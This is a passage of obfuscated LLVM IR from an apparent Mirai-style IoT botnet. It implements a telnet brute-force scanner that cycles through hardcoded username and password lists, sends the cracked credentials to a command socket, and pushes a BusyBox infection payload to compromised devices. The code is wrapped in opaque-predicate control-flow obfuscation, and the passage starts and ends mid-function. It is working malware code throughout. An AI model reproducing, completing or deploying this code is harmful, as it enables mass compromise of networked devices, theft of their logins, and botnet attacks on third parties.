  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %834
  call void @reset_telstate(%struct.telstate_t* %835)
  br label %1372

; <label>:836:                                    ; preds = %originalBBpart296
  %837 = load i32, i32* %6, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %838
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %839, i32 0, i32 0
  %841 = load i32, i32* %840, align 16
  %842 = call i64 @send(i32 %841, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %843 = icmp slt i64 %842, 0
  br i1 %843, label %844, label %848

; <label>:844:                                    ; preds = %836
  %845 = load i32, i32* %6, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %846
  call void @reset_telstate(%struct.telstate_t* %847)
  br label %1372

; <label>:848:                                    ; preds = %836
  %849 = load i32, i32* @x.73
  %850 = load i32, i32* @y.74
  %851 = sub i32 %849, 1
  %852 = mul i32 %849, %851
  %853 = urem i32 %852, 2
  %854 = icmp eq i32 %853, 0
  %855 = icmp slt i32 %850, 10
  %856 = or i1 %854, %855
  br i1 %856, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %848
  %857 = load i32, i32* %6, align 4
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %858
  call void @advance_telstate(%struct.telstate_t* %859, i32 6)
  %860 = load i32, i32* @x.73
  %861 = load i32, i32* @y.74
  %862 = sub i32 %860, 1
  %863 = mul i32 %860, %862
  %864 = urem i32 %863, 2
  %865 = icmp eq i32 %864, 0
  %866 = icmp slt i32 %861, 10
  %867 = or i1 %865, %866
  br i1 %867, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %1355

; <label>:868:                                    ; preds = %154
  %869 = load i32, i32* %6, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 0
  %873 = load i32, i32* %872, align 16
  %874 = load i32, i32* %3, align 4
  %875 = load i32, i32* %6, align 4
  %876 = sext i32 %875 to i64
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %876
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %877, i32 0, i32 9
  %879 = load i8*, i8** %878, align 8
  %880 = call i32 @read_until_response(i32 %873, i32 %874, i8* %879, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %881 = icmp ne i32 %880, 0
  br i1 %881, label %882, label %1033

; <label>:882:                                    ; preds = %868
  %883 = load i32, i32* @x.73
  %884 = load i32, i32* @y.74
  %885 = sub i32 %883, 1
  %886 = mul i32 %883, %885
  %887 = urem i32 %886, 2
  %888 = icmp eq i32 %887, 0
  %889 = icmp slt i32 %884, 10
  %890 = or i1 %888, %889
  br i1 %890, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %882
  %891 = call i64 @time(i64* null) #5
  %892 = trunc i64 %891 to i32
  %893 = load i32, i32* %6, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 7
  store i32 %892, i32* %896, align 16
  %897 = load i32, i32* %6, align 4
  %898 = sext i32 %897 to i64
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %898
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %899, i32 0, i32 9
  %901 = load i8*, i8** %900, align 8
  %902 = call i32 @contains_fail(i8* %901)
  %903 = icmp ne i32 %902, 0
  %904 = load i32, i32* @x.73
  %905 = load i32, i32* @y.74
  %906 = sub i32 %904, 1
  %907 = mul i32 %904, %906
  %908 = urem i32 %907, 2
  %909 = icmp eq i32 %908, 0
  %910 = icmp slt i32 %905, 10
  %911 = or i1 %909, %910
  br i1 %911, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %903, label %912, label %916

; <label>:912:                                    ; preds = %originalBBpart2104
  %913 = load i32, i32* %6, align 4
  %914 = sext i32 %913 to i64
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %914
  call void @advance_telstate(%struct.telstate_t* %915, i32 0)
  br label %1032

; <label>:916:                                    ; preds = %originalBBpart2104
  %917 = load i32, i32* @x.73
  %918 = load i32, i32* @y.74
  %919 = sub i32 %917, 1
  %920 = mul i32 %917, %919
  %921 = urem i32 %920, 2
  %922 = icmp eq i32 %921, 0
  %923 = icmp slt i32 %918, 10
  %924 = or i1 %922, %923
  br i1 %924, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %916
  %925 = load i32, i32* %6, align 4
  %926 = sext i32 %925 to i64
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %926
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %927, i32 0, i32 9
  %929 = load i8*, i8** %928, align 8
  %930 = call i32 @contains_success(i8* %929)
  %931 = icmp ne i32 %930, 0
  %932 = load i32, i32* @x.73
  %933 = load i32, i32* @y.74
  %934 = sub i32 %932, 1
  %935 = mul i32 %932, %934
  %936 = urem i32 %935, 2
  %937 = icmp eq i32 %936, 0
  %938 = icmp slt i32 %933, 10
  %939 = or i1 %937, %938
  br i1 %939, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %931, label %940, label %1011

; <label>:940:                                    ; preds = %originalBBpart2108
  %941 = load i32, i32* %6, align 4
  %942 = sext i32 %941 to i64
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %942
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %943, i32 0, i32 3
  %945 = load i8, i8* %944, align 1
  %946 = zext i8 %945 to i32
  %947 = icmp eq i32 %946, 2
  br i1 %947, label %948, label %968

; <label>:948:                                    ; preds = %940
  %949 = load i32, i32* @x.73
  %950 = load i32, i32* @y.74
  %951 = sub i32 %949, 1
  %952 = mul i32 %949, %951
  %953 = urem i32 %952, 2
  %954 = icmp eq i32 %953, 0
  %955 = icmp slt i32 %950, 10
  %956 = or i1 %954, %955
  br i1 %956, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %948
  %957 = load i32, i32* %6, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %958
  call void @advance_telstate(%struct.telstate_t* %959, i32 7)
  %960 = load i32, i32* @x.73
  %961 = load i32, i32* @y.74
  %962 = sub i32 %960, 1
  %963 = mul i32 %960, %962
  %964 = urem i32 %963, 2
  %965 = icmp eq i32 %964, 0
  %966 = icmp slt i32 %961, 10
  %967 = or i1 %965, %966
  br i1 %967, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %994

; <label>:968:                                    ; preds = %940
  %969 = load i32, i32* @mainCommSock, align 4
  %970 = load i32, i32* %6, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %971
  %973 = call i8* @get_telstate_host(%struct.telstate_t* %972)
  %974 = load i32, i32* %6, align 4
  %975 = sext i32 %974 to i64
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %975
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %976, i32 0, i32 4
  %978 = load i8, i8* %977, align 2
  %979 = zext i8 %978 to i64
  %980 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %979
  %981 = load i8*, i8** %980, align 8
  %982 = load i32, i32* %6, align 4
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %983
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %984, i32 0, i32 5
  %986 = load i8, i8* %985, align 1
  %987 = zext i8 %986 to i64
  %988 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %987
  %989 = load i8*, i8** %988, align 8
  %990 = call i32 (i32, i8*, ...) @sockprintf(i32 %969, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.488, i32 0, i32 0), i8* %973, i8* %981, i8* %989)
  %991 = load i32, i32* %6, align 4
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %992
  call void @advance_telstate(%struct.telstate_t* %993, i32 7)
  br label %994

; <label>:994:                                    ; preds = %968, %originalBBpart2112
  %995 = load i32, i32* @x.73
  %996 = load i32, i32* @y.74
  %997 = sub i32 %995, 1
  %998 = mul i32 %995, %997
  %999 = urem i32 %998, 2
  %1000 = icmp eq i32 %999, 0
  %1001 = icmp slt i32 %996, 10
  %1002 = or i1 %1000, %1001
  br i1 %1002, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %994
  %1003 = load i32, i32* @x.73
  %1004 = load i32, i32* @y.74
  %1005 = sub i32 %1003, 1
  %1006 = mul i32 %1003, %1005
  %1007 = urem i32 %1006, 2
  %1008 = icmp eq i32 %1007, 0
  %1009 = icmp slt i32 %1004, 10
  %1010 = or i1 %1008, %1009
  br i1 %1010, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %1031

; <label>:1011:                                   ; preds = %originalBBpart2108
  %1012 = load i32, i32* @x.73
  %1013 = load i32, i32* @y.74
  %1014 = sub i32 %1012, 1
  %1015 = mul i32 %1012, %1014
  %1016 = urem i32 %1015, 2
  %1017 = icmp eq i32 %1016, 0
  %1018 = icmp slt i32 %1013, 10
  %1019 = or i1 %1017, %1018
  br i1 %1019, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %1011
  %1020 = load i32, i32* %6, align 4
  %1021 = sext i32 %1020 to i64
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1021
  call void @reset_telstate(%struct.telstate_t* %1022)
  %1023 = load i32, i32* @x.73
  %1024 = load i32, i32* @y.74
  %1025 = sub i32 %1023, 1
  %1026 = mul i32 %1023, %1025
  %1027 = urem i32 %1026, 2
  %1028 = icmp eq i32 %1027, 0
  %1029 = icmp slt i32 %1024, 10
  %1030 = or i1 %1028, %1029
  br i1 %1030, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %1031

; <label>:1031:                                   ; preds = %originalBBpart2120, %originalBBpart2116
  br label %1032

; <label>:1032:                                   ; preds = %1031, %912
  br label %1372

; <label>:1033:                                   ; preds = %868
  %1034 = load i32, i32* %6, align 4
  %1035 = sext i32 %1034 to i64
  %1036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1035
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1036, i32 0, i32 7
  %1038 = load i32, i32* %1037, align 16
  %1039 = add i32 %1038, 7
  %1040 = zext i32 %1039 to i64
  %1041 = call i64 @time(i64* null) #5
  %1042 = icmp slt i64 %1040, %1041
  br i1 %1042, label %1043, label %1047

; <label>:1043:                                   ; preds = %1033
  %1044 = load i32, i32* %6, align 4
  %1045 = sext i32 %1044 to i64
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1045
  call void @reset_telstate(%struct.telstate_t* %1046)
  br label %1047

; <label>:1047:                                   ; preds = %1043, %1033
  br label %1355

; <label>:1048:                                   ; preds = %154
  %1049 = load i32, i32* @x.73
  %1050 = load i32, i32* @y.74
  %1051 = sub i32 %1049, 1
  %1052 = mul i32 %1049, %1051
  %1053 = urem i32 %1052, 2
  %1054 = icmp eq i32 %1053, 0
  %1055 = icmp slt i32 %1050, 10
  %1056 = or i1 %1054, %1055
  br i1 %1056, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1048
  %1057 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1058 = call i32 (i8*, i8*, ...) @sprintf(i8* %1057, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.489, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %1059 = load i32, i32* %6, align 4
  %1060 = sext i32 %1059 to i64
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1060
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1061, i32 0, i32 0
  %1063 = load i32, i32* %1062, align 16
  %1064 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1065 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1066 = call i64 @strlen(i8* %1065) #9
  %1067 = call i64 @send(i32 %1063, i8* %1064, i64 %1066, i32 16384)
  %1068 = icmp slt i64 %1067, 0
  %1069 = load i32, i32* @x.73
  %1070 = load i32, i32* @y.74
  %1071 = sub i32 %1069, 1
  %1072 = mul i32 %1069, %1071
  %1073 = urem i32 %1072, 2
  %1074 = icmp eq i32 %1073, 0
  %1075 = icmp slt i32 %1070, 10
  %1076 = or i1 %1074, %1075
  br i1 %1076, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %1068, label %1077, label %1081

; <label>:1077:                                   ; preds = %originalBBpart2124
  %1078 = load i32, i32* %6, align 4
  %1079 = sext i32 %1078 to i64
  %1080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1079
  call void @reset_telstate(%struct.telstate_t* %1080)
  br label %1372

; <label>:1081:                                   ; preds = %originalBBpart2124
  call void @RemoveTempDirs()
  %1082 = load i32, i32* @mainCommSock, align 4
  %1083 = load i32, i32* %6, align 4
  %1084 = sext i32 %1083 to i64
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1084
  %1086 = call i8* @get_telstate_host(%struct.telstate_t* %1085)
  %1087 = load i32, i32* %6, align 4
  %1088 = sext i32 %1087 to i64
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1088
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1089, i32 0, i32 4
  %1091 = load i8, i8* %1090, align 2
  %1092 = zext i8 %1091 to i64
  %1093 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1092
  %1094 = load i8*, i8** %1093, align 8
  %1095 = load i32, i32* %6, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1096
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1097, i32 0, i32 5
  %1099 = load i8, i8* %1098, align 1
  %1100 = zext i8 %1099 to i64
  %1101 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1100
  %1102 = load i8*, i8** %1101, align 8
  %1103 = call i32 (i32, i8*, ...) @sockprintf(i32 %1082, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.490, i32 0, i32 0), i8* %1086, i8* %1094, i8* %1102)
  %1104 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1105 = call i32 (i8*, i8*, ...) @sprintf(i8* %1104, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.491, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %1106 = load i32, i32* %6, align 4
  %1107 = sext i32 %1106 to i64
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1107
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1108, i32 0, i32 0
  %1110 = load i32, i32* %1109, align 16
  %1111 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1112 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1113 = call i64 @strlen(i8* %1112) #9
  %1114 = call i64 @send(i32 %1110, i8* %1111, i64 %1113, i32 16384)
  %1115 = icmp slt i64 %1114, 0
  br i1 %1115, label %1116, label %1120

; <label>:1116:                                   ; preds = %1081
  %1117 = load i32, i32* %6, align 4
  %1118 = sext i32 %1117 to i64
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1118
  call void @reset_telstate(%struct.telstate_t* %1119)
  br label %1372

; <label>:1120:                                   ; preds = %1081
  %1121 = load i32, i32* @mainCommSock, align 4
  %1122 = load i32, i32* %6, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1123
  %1125 = call i8* @get_telstate_host(%struct.telstate_t* %1124)
  %1126 = load i32, i32* %6, align 4
  %1127 = sext i32 %1126 to i64
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1127
  %1129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1128, i32 0, i32 4
  %1130 = load i8, i8* %1129, align 2
  %1131 = zext i8 %1130 to i64
  %1132 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1131
  %1133 = load i8*, i8** %1132, align 8
  %1134 = load i32, i32* %6, align 4
  %1135 = sext i32 %1134 to i64
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1135
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1136, i32 0, i32 5
  %1138 = load i8, i8* %1137, align 1
  %1139 = zext i8 %1138 to i64
  %1140 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1139
  %1141 = load i8*, i8** %1140, align 8
  %1142 = call i32 (i32, i8*, ...) @sockprintf(i32 %1121, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.492, i32 0, i32 0), i8* %1125, i8* %1133, i8* %1141)
  %1143 = load i32, i32* %6, align 4
  %1144 = sext i32 %1143 to i64
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1144
  call void @advance_telstate(%struct.telstate_t* %1145, i32 8)
  br label %1355

; <label>:1146:                                   ; preds = %154
  %1147 = load i32, i32* @x.73
  %1148 = load i32, i32* @y.74
  %1149 = sub i32 %1147, 1
  %1150 = mul i32 %1147, %1149
  %1151 = urem i32 %1150, 2
  %1152 = icmp eq i32 %1151, 0
  %1153 = icmp slt i32 %1148, 10
  %1154 = or i1 %1152, %1153
  br i1 %1154, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1146
  %1155 = call i64 @time(i64* null) #5
  %1156 = trunc i64 %1155 to i32
  %1157 = load i32, i32* %6, align 4
  %1158 = sext i32 %1157 to i64
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1158
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1159, i32 0, i32 7
  store i32 %1156, i32* %1160, align 16
  %1161 = load i32, i32* %6, align 4
  %1162 = sext i32 %1161 to i64
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1162
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1163, i32 0, i32 0
  %1165 = load i32, i32* %1164, align 16
  %1166 = call i64 @send(i32 %1165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.493, i32 0, i32 0), i64 4, i32 16384)
  %1167 = icmp slt i64 %1166, 0
  %1168 = load i32, i32* @x.73
  %1169 = load i32, i32* @y.74
  %1170 = sub i32 %1168, 1
  %1171 = mul i32 %1168, %1170
  %1172 = urem i32 %1171, 2
  %1173 = icmp eq i32 %1172, 0
  %1174 = icmp slt i32 %1169, 10
  %1175 = or i1 %1173, %1174
  br i1 %1175, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %1167, label %1176, label %1177

; <label>:1176:                                   ; preds = %originalBBpart2128
  br label %1177

; <label>:1177:                                   ; preds = %1176, %originalBBpart2128
  %1178 = load i32, i32* %6, align 4
  %1179 = sext i32 %1178 to i64
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1179
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1180, i32 0, i32 0
  %1182 = load i32, i32* %1181, align 16
  %1183 = call i64 @send(i32 %1182, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.494, i32 0, i32 0), i64 7, i32 16384)
  %1184 = icmp slt i64 %1183, 0
  br i1 %1184, label %1185, label %1186

; <label>:1185:                                   ; preds = %1177
  br label %1186

; <label>:1186:                                   ; preds = %1185, %1177
  %1187 = load i32, i32* %6, align 4
  %1188 = sext i32 %1187 to i64
  %1189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1188
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1189, i32 0, i32 0
  %1191 = load i32, i32* %1190, align 16
  %1192 = load i8*, i8** @Busybox_Payload, align 8
  %1193 = load i8*, i8** @Busybox_Payload, align 8
  %1194 = call i64 @strlen(i8* %1193) #9
  %1195 = call i64 @send(i32 %1191, i8* %1192, i64 %1194, i32 16384)
  %1196 = icmp slt i64 %1195, 0
  br i1 %1196, label %1197, label %1217

; <label>:1197:                                   ; preds = %1186
  %1198 = load i32, i32* @x.73
  %1199 = load i32, i32* @y.74
  %1200 = sub i32 %1198, 1
  %1201 = mul i32 %1198, %1200
  %1202 = urem i32 %1201, 2
  %1203 = icmp eq i32 %1202, 0
  %1204 = icmp slt i32 %1199, 10
  %1205 = or i1 %1203, %1204
  br i1 %1205, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1197
  %1206 = load i32, i32* %6, align 4
  %1207 = sext i32 %1206 to i64
  %1208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1207
  call void @reset_telstate(%struct.telstate_t* %1208)
  %1209 = load i32, i32* @x.73
  %1210 = load i32, i32* @y.74
  %1211 = sub i32 %1209, 1
  %1212 = mul i32 %1209, %1211
  %1213 = urem i32 %1212, 2
  %1214 = icmp eq i32 %1213, 0
  %1215 = icmp slt i32 %1210, 10
  %1216 = or i1 %1214, %1215
  br i1 %1216, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1372

; <label>:1217:                                   ; preds = %1186
  %1218 = load i32, i32* @mainCommSock, align 4
  %1219 = load i32, i32* %6, align 4
  %1220 = sext i32 %1219 to i64
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1220
  %1222 = call i8* @get_telstate_host(%struct.telstate_t* %1221)
  %1223 = load i32, i32* %6, align 4
  %1224 = sext i32 %1223 to i64
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1224
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1225, i32 0, i32 4
  %1227 = load i8, i8* %1226, align 2
  %1228 = zext i8 %1227 to i64
  %1229 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %1228
  %1230 = load i8*, i8** %1229, align 8
  %1231 = load i32, i32* %6, align 4
  %1232 = sext i32 %1231 to i64
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1232
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1233, i32 0, i32 5
  %1235 = load i8, i8* %1234, align 1
  %1236 = zext i8 %1235 to i64
  %1237 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %1236
  %1238 = load i8*, i8** %1237, align 8
  %1239 = call i32 (i32, i8*, ...) @sockprintf(i32 %1218, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.495, i32 0, i32 0), i8* %1222, i8* %1230, i8* %1238)
  %1240 = load i32, i32* %6, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1241
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1242, i32 0, i32 0
  %1244 = load i32, i32* %1243, align 16
  %1245 = load i32, i32* %3, align 4
  %1246 = load i32, i32* %6, align 4
  %1247 = sext i32 %1246 to i64
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1247
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1248, i32 0, i32 9
  %1250 = load i8*, i8** %1249, align 8
  %1251 = call i32 @read_until_response(i32 %1244, i32 %1245, i8* %1250, i32 1024, i8** bitcast ([10 x i8]* @.str.499 to i8**))
  %1252 = icmp ne i32 %1251, 0
  br i1 %1252, label %1253, label %1293

; <label>:1253:                                   ; preds = %1217
  %1254 = load i32, i32* %6, align 4
  %1255 = sext i32 %1254 to i64
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1255
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1256, i32 0, i32 9
  %1258 = load i8*, i8** %1257, align 8
  %1259 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %1258, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.496, i32 0, i32 0))
  %1260 = icmp ne i32 %1259, 0
  br i1 %1260, label %1261, label %1292

; <label>:1261:                                   ; preds = %1253
  %1262 = load i32, i32* %6, align 4
  %1263 = sext i32 %1262 to i64
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1263
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1264, i32 0, i32 3
  %1266 = load i8, i8* %1265, align 1
  %1267 = zext i8 %1266 to i32
  %1268 = icmp ne i32 %1267, 3
  br i1 %1268, label %1269, label %1292

; <label>:1269:                                   ; preds = %1261
  %1270 = load i32, i32* @mainCommSock, align 4
  %1271 = load i32, i32* %6, align 4
  %1272 = sext i32 %1271 to i64
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1272
  %1274 = call i8* @get_telstate_host(%struct.telstate_t* %1273)
  %1275 = load i32, i32* %6, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1277, i32 0, i32 4
  %1279 = load i8, i8* %1278, align 2
  %1280 = zext i8 %1279 to i64
  %1281 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %1280
  %1282 = load i8*, i8** %1281, align 8
  %1283 = load i32, i32* %6, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1285, i32 0, i32 5
  %1287 = load i8, i8* %1286, align 1
  %1288 = zext i8 %1287 to i64
  %1289 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %1288
  %1290 = load i8*, i8** %1289, align 8
  %1291 = call i32 (i32, i8*, ...) @sockprintf(i32 %1270, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.497, i32 0, i32 0), i8* %1274, i8* %1282, i8* %1290)
  br label %1292

; <label>:1292:                                   ; preds = %1269, %1261, %1253
  br label %1293

; <label>:1293:                                   ; preds = %1292, %1217
  %1294 = load i32, i32* %6, align 4
  %1295 = sext i32 %1294 to i64
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1295
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1296, i32 0, i32 7
  %1298 = load i32, i32* %1297, align 16
  %1299 = add i32 %1298, 45
  %1300 = zext i32 %1299 to i64
  %1301 = call i64 @time(i64* null) #5
  %1302 = icmp slt i64 %1300, %1301
  br i1 %1302, label %1303, label %1338

; <label>:1303:                                   ; preds = %1293
  %1304 = load i32, i32* %6, align 4
  %1305 = sext i32 %1304 to i64
  %1306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1305
  %1307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1306, i32 0, i32 3
  %1308 = load i8, i8* %1307, align 1
  %1309 = zext i8 %1308 to i32
  %1310 = icmp ne i32 %1309, 3
  br i1 %1310, label %1311, label %1334

; <label>:1311:                                   ; preds = %1303
  %1312 = load i32, i32* @mainCommSock, align 4
  %1313 = load i32, i32* %6, align 4
  %1314 = sext i32 %1313 to i64
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1314
  %1316 = call i8* @get_telstate_host(%struct.telstate_t* %1315)
  %1317 = load i32, i32* %6, align 4
